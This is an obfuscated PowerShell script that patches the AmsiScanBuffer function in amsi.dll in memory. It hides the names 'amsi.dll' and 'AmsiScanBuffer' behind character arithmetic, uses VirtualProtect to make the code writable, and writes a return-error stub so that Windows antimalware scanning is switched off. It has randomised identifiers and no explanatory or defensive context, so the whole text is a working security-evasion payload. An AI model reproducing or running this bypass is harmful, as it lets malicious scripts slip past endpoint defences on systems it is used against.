$BiBLD = @"
using System;
using System.Runtime.InteropServices;
public class BiBLD {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr Rp6KmTMAXJb, string nr93Iko4oh9Gl_W);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr k2Lc, UIntPtr q6mu, uint tcdma1, out uint TnAP4M77fwZvEaV);
}
"@

Add-Type $BiBLD

$AmsnHhnIy6f_8QED = [BiBLD]::LoadLibrary("$([chAR](97)+[cHar](109*88/88)+[char]([bytE]0x73)+[CHaR]([byTe]0x69)+[ChAR](28+18)+[CHAr]([bYte]0x64)+[CHaR]([byTe]0x6c)+[cHAr]([BytE]0x6c))")
$y4apAesGMwkPUVes = [BiBLD]::GetProcAddress($AmsnHhnIy6f_8QED, "$([CHAR](65*32/32)+[Char](109)+[ChAR](115*98/98)+[CHar]([BYte]0x69)+[ChAr](83+5-5)+[CHaR]([bYTe]0x63)+[CHAr]([BYTe]0x61)+[ChAr](110+41-41)+[chAr]([BYtE]0x42)+[cHar]([BYTE]0x75)+[cHAR]([bYTe]0x66)+[CHAR](102)+[CHaR](101+90-90)+[chaR](114*95/95))")
$p = 0
[BiBLD]::VirtualProtect($y4apAesGMwkPUVes, [uint32]5, 0x40, [ref]$p)
$Cl5yBwA3 = "0xB8"
$qxRQRdr = "0x57"
$JN4q3u5yLlLET = "0x00"
$Y_fLS3X = "0x07"
$YiGPbo4T = "0x80"
$Ts_X8_IpA7XUTqkzugP = "0xC3"
$Iz3RnVCD8NAMl7c0k = [Byte[]] ($Cl5yBwA3,$qxRQRdr,$JN4q3u5yLlLET,$Y_fLS3X,+$YiGPbo4T,+$Ts_X8_IpA7XUTqkzugP)
[System.Runtime.InteropServices.Marshal]::Copy($Iz3RnVCD8NAMl7c0k, 0, $y4apAesGMwkPUVes, 6)